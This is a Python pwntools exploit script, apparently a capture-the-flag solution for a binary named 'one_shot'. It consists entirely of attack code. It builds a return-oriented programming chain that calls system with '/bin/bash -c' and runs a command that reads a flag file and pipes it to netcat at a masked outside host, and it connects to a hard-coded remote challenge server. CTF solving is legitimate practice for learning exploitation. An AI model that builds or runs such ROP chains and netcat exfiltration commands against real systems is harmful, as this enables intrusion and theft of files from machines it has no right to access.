from pwn import *
import sys

env = {
    'LD_PRELOAD': './libc-2.24.so'
}

dbadd = 0x40084c
eax = 0x6012c7
write = 0x400673
poprdi = 0x400843
addr = 0x601200-4
moveax = 0x4006f7
add2al = 0x40084c
addal = 0x40084e

if sys.argv[1] == "1":
    r = remote('178.128.87.12', 31338)
else:
    r = process('./one_shot', env=env)
    raw_input('?')


payload = p32(0x8A919FF0)
payload += p32(0x300)
payload += p32(8) # 0x601200
payload += p64(0) # 0x601204
payload += p32(0x45454545) # 0x60120c
payload += p64(0)*4
payload += p64(0x601200+0x150) # 0x601230 "/bin/bash"
payload += p64(0x601200+0x170) # "-c"
payload += p64(0x601200+0x180) # "payload"
payload += p64(0)
payload += p64(59) #0x601250
payload = payload.ljust(0x80, '\x00')
# write to bss
payload += p64(addr+0x20)#rbp
payload += p64(write)
payload += p64(0)
payload += p64(addr+4+0x20) #rbp
payload += p64(write+7)
payload += p64(0)
payload += p64(0x601204+0x20) #rbp 
# write done to bss

payload += p64(poprdi)
payload += p64(0x601020)
payload += p64(write+7)
payload += p64(0)
payload += p64(0x601204-3+0x20) #rbp
payload += p64(poprdi)
payload += p64(0x60120C)
payload += p64(write)
payload += p64(0)
payload += p64(0x601250+0xc) #rbp
payload += p64(moveax)
payload += p64(0)*2
payload += p64(0x40083c) # pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
payload += p64(0x601204) #r12
payload += p64(0) #r13
payload += p64(0x601230) #r14
payload += p64(0x601200+0x150) #r15
payload += p64(0x400820) # call qword ptr [r12 + rbx*8] = [0x601227] = system

payload = payload.ljust(0x158, '\x00')
payload += "/bin/bash"
payload = payload.ljust(0x178, '\x00')
payload += "-c"
payload = payload.ljust(0x188, '\x00')
payload += "cat /home/o*/flag|nc xxx.xxx.xxx.xxx 5555"
payload = payload.ljust(0x234, '\x00')
log.info("length: %#x" %len(payload))
r.send(payload)
r.interactive()
